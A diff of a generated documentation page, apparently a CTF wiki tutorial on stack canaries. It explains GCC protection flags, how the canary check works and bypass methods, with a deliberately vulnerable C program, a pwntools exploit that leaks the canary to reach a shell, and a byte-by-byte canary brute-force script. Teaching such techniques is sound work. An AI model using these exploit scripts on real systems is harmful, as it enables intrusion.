@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../../../..">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+      <meta name="generator" content="mkdocs-1.1, mkdocs-material-4.6.3">
     
     
       
@@ -46,9 +46,9 @@
       
     
     
-      <link rel="stylesheet" href="../../../../assets/stylesheets/application.e194128b.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.adb8469c.css">
       
-        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.3e3d1dff.css">
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.a8b3c06d.css">
       
       
         
@@ -57,7 +57,7 @@
       
     
     
-      <script src="../../../../assets/javascripts/modernizr.74668098.js"></script>
+      <script src="../../../../assets/javascripts/modernizr.86422ebf.js"></script>
     
     
       
@@ -4743,16 +4743,16 @@
 <h2 id="canary-principle">Canary Principle<a class="headerlink" href="#canary-principle" title="Permanent link">&para;</a></h2>
 <h3 id="using-canary-in-gcc">Using Canary in GCC<a class="headerlink" href="#using-canary-in-gcc" title="Permanent link">&para;</a></h3>
 <p>Canary can be set in GCC with the following parameters:</p>
-<div class="codehilite"><pre><span></span>-fstack-protector enables protection, but only inserts protection <span class="k">for</span> functions that have arrays in <span class="nb">local</span> variables
+<div class="codehilite"><pre><span></span><code>-fstack-protector enables protection, but only inserts protection <span class="k">for</span> functions that have arrays in <span class="nb">local</span> variables
 -fstack-protector-all Enable protection, insert protection <span class="k">for</span> all functions
 -fstack-protector-strong
 -fstack-protector-explicit Only protects functions with explicit stack_protect attribute
 -fno-stack-protector Disable protection.
-</pre></div>
+</code></pre></div>
 
 <h3 id="canary-implementation-principle">Canary Implementation Principle<a class="headerlink" href="#canary-implementation-principle" title="Permanent link">&para;</a></h3>
 <p>The stack structure that enables Canary protection is as follows</p>
-<div class="codehilite"><pre><span></span>        High
+<div class="codehilite"><pre><span></span><code>        High
 
         Address |                 |
 
@@ -4778,23 +4778,23 @@
         Low     |                 |
 
         Address
-</pre></div>
+</code></pre></div>
 
 <p>When the program enables Canary compilation, the value at fs register 0x28 is taken in the prologue of the function and stored in the stack at %ebp-0x8.
 This operation is to insert the Canary value into the stack, the code is as follows:</p>
-<div class="codehilite"><pre><span></span><span class="nf">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="no">fs</span><span class="p">:[</span><span class="mi">0x28</span><span class="p">]</span>
+<div class="codehilite"><pre><span></span><code><span class="nf">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="no">fs</span><span class="p">:[</span><span class="mi">0x28</span><span class="p">]</span>
 <span class="nf">mov</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="no">rax</span>
-</pre></div>
+</code></pre></div>
 
 <p>This value is taken out before the function returns and XORed with the value of fs:0x28. If the result of the exclusive OR is 0, the canary is not modified, and the function returns normally. This operation is to detect whether a stack overflow occurs.</p>
-<div class="codehilite"><pre><span></span><span class="nf">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">]</span>
+<div class="codehilite"><pre><span></span><code><span class="nf">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">]</span>
 <span class="nf">xor</span> <span class="no">rdx</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="no">fs</span><span class="p">:</span> <span class="mi">0x28</span>
 <span class="nf">je</span> <span class="mh">0x4005d7</span> <span class="p">&lt;</span><span class="no">main</span><span class="p">+</span><span class="mi">65</span><span class="p">&gt;</span>
 <span class="nf">call</span>   <span class="mh">0x400460</span> <span class="p">&lt;</span><span class="no">__stack_chk_fail@plt</span><span class="p">&gt;</span>
-</pre></div>
+</code></pre></div>
 
 <p>If the canary has been illegally modified, the program flow will go to <code>__stack_chk_fail</code>. <code>__stack_chk_fail</code> is also a function in glibc, which by default is delayed by ELF and is defined as follows.</p>
-<div class="codehilite"><pre><span></span><span class="n">eglibc</span><span class="o">-</span><span class="mf">2.19</span><span class="o">/</span><span class="n">debug</span><span class="o">/</span><span class="n">stack_chk_fail</span><span class="p">.</span><span class="n">c</span>
+<div class="codehilite"><pre><span></span><code><span class="n">eglibc</span><span class="o">-</span><span class="mf">2.19</span><span class="o">/</span><span class="n">debug</span><span class="o">/</span><span class="n">stack_chk_fail</span><span class="p">.</span><span class="n">c</span>
 <span class="kt">void</span> <span class="n">__attribute__</span> <span class="p">((</span><span class="n">noreturn</span><span class="p">))</span> <span class="n">__stack_chk_fail</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
 <span class="p">{</span>
   <span class="n">__fortify_fail</span> <span class="p">(</span><span class="s">&quot;stack smashing detected&quot;</span><span class="p">);</span>
@@ -4806,11 +4806,11 @@ This operation is to insert the Canary value into the stack, the code is as foll
     <span class="n">__libc_message</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">&quot;*** %s ***: %s terminated</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
                     <span class="n">msg</span><span class="p">,</span> <span class="n">__libc_argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">?:</span> <span class="s">&quot;&lt;unknown&gt;&quot;</span><span class="p">);</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <p>This means that you can hijack the process by hijacking the <code>__stack_chk_fail</code>&#39;s got value or leaking content with <code>__stack_chk_fail</code> (see stack smash).</p>
 <p>Further, for Linux, the fs register actually points to the TLS structure of the current stack, and fs:0x28 points to stack_guard.
-<div class="codehilite"><pre><span></span><span class="k">typedef</span> <span class="k">struct</span>
+<div class="codehilite"><pre><span></span><code><span class="k">typedef</span> <span class="k">struct</span>
 <span class="p">{</span>
   <span class="kt">void</span> <span class="o">*</span><span class="n">tcb</span><span class="p">;</span>        <span class="cm">/* Pointer to the TCB.  Not necessarily the</span>
 <span class="cm">                                   thread descriptor used by libpthread.  */</span>
@@ -4821,10 +4821,10 @@ This operation is to insert the Canary value into the stack, the code is as foll
   <span class="kt">uintptr_t</span> <span class="n">stack_guard</span><span class="p">;</span>
   <span class="p">...</span>
 <span class="p">}</span> <span class="n">tcbhead_t</span><span class="p">;</span>
-</pre></div></p>
+</code></pre></div></p>
 <p>A bypass protection mechanism can be implemented if there is an overflow that overrides the Canary value stored in TLS.</p>
 <p>In fact, the value in TLS is initialized by the function security_init.</p>
-<div class="codehilite"><pre><span></span><span class="k">static</span> <span class="kt">void</span>
+<div class="codehilite"><pre><span></span><code><span class="k">static</span> <span class="kt">void</span>
 <span class="nf">security_init</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
 <span class="p">{</span>
 <span class="c1">// The value of _dl_random is already written by the kernel when entering this function.</span>
@@ -4839,7 +4839,7 @@ This operation is to insert the Canary value into the stack, the code is as foll
 <span class="c1">//THREAD_SET_STACK_GUARD macro is used to set TLS</span>
 <span class="cp">#define THREAD_SET_STACK_GUARD(value) \</span>
 <span class="cp">THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span>
-</pre></div>
+</code></pre></div>
 
 <h2 id="canary-bypass-technology">Canary bypass technology<a class="headerlink" href="#canary-bypass-technology" title="Permanent link">&para;</a></h2>
 <h3 id="preface">Preface<a class="headerlink" href="#preface" title="Permanent link">&para;</a></h3>
@@ -4850,7 +4850,7 @@ The idea of leaking Canary in the stack is to overwrite the low byte of Canary t
 This type of utilization requires the existence of a suitable output function, and may require the first overflow to leak Canary, and then overflow the control execution flow again.</p>
 <h4 id="using-examples">Using examples<a class="headerlink" href="#using-examples" title="Permanent link">&para;</a></h4>
 <p>The sample source code for the vulnerability is as follows:</p>
-<div class="codehilite"><pre><span></span><span class="c1">// ex2.c</span>
+<div class="codehilite"><pre><span></span><code><span class="c1">// ex2.c</span>
 <span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
 <span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
 <span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
@@ -4876,12 +4876,12 @@ This type of utilization requires the existence of a suitable output function, a
     <span class="n">vuln</span> <span class="p">();</span>
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <p>Compile to 32bit program, open NX, ASLR, Canary protection</p>
 <p>First print out the 4-digit Canary by overwriting the last <code>\x00</code> byte of Canary
 After that, calculate the offset, fill Canary into the corresponding overflow position, and implement Ret into the getshell function.</p>
-<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s1">&#39;ex2&#39;</span>
 <span class="c1">#context.log_level = &#39;debug&#39;</span>
@@ -4899,14 +4899,14 @@ After that, calculate the offset, fill Canary into the corresponding overflow po
 <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">io</span><span class="o">.</span><span class="n">recv</span> <span class="p">()</span>
 <span class="n">io</span><span class="o">.</span><span class="n">interactive</span> <span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <h3 id="one-by-one-crack-canary">one-by-one crack Canary<a class="headerlink" href="#one-by-one-crack-canary" title="Permanent link">&para;</a></h3>
 <p>For Canary, although the Canary is different each time the same process restarts (the same as GS, GS is restarted), but the Canary of each thread in the same process is identical.
 Also, there is a class that opens the child process interaction through the fork function, because the fork function directly copies the memory of the parent process, so the Canary of each child process created is the same. We can use this feature to completely blast Canary byte by byte.
 In the famous offset2libc bypassing all protected linux64bit articles, the author is using this way to blast the Canary:
 This is the Python code for blasting:</p>
-<div class="codehilite"><pre><span></span><span class="nb">print</span> <span class="s2">&quot;[+] Brute forcing stack canary &quot;</span>
+<div class="codehilite"><pre><span></span><code><span class="nb">print</span> <span class="s2">&quot;[+] Brute forcing stack canary &quot;</span>
 <span class="n">start</span> <span class="o">=</span> <span class="nb">len</span> <span class="p">(</span><span class="n">p</span><span class="p">)</span>
 <span class="n">stop</span> <span class="o">=</span> <span class="nb">len</span> <span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">+</span><span class="mi">8</span>
 <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">stop</span><span class="p">:</span>
@@ -4921,7 +4921,7 @@ This is the Python code for blasting:</p>
          <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
 <span class="n">canary</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="n">stop</span><span class="p">:</span><span class="n">start</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;hex&quot;</span><span class="p">)</span>
 <span class="nb">print</span> <span class="s2">&quot;   [+] SSP value is 0x</span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">canary</span>
-</pre></div>
+</code></pre></div>
 
 <h3 id="hijack-__stack_chk_fail-function">Hijack __stack_chk_fail function<a class="headerlink" href="#hijack-__stack_chk_fail-function" title="Permanent link">&para;</a></h3>
 <p>The processing logic that knows that Canary fails will enter the <code>__stack_chk_fail</code>ed function. The <code>__stack_chk_fail</code>ed function is a normal delay binding function that can be hijacked by modifying the GOT table.</p>
@@ -4994,7 +4994,7 @@ This is the Python code for blasting:</p>
       
     </div>
     
-      <script src="../../../../assets/javascripts/application.970603a6.js"></script>
+      <script src="../../../../assets/javascripts/application.df00da5d.js"></script>
       
         
         
@@ -5009,7 +5009,7 @@ This is the Python code for blasting:</p>
           
         
       
-      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
+      <script>app.initialize({version:"1.1",url:{base:"../../../.."}})</script>
       
         <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
       
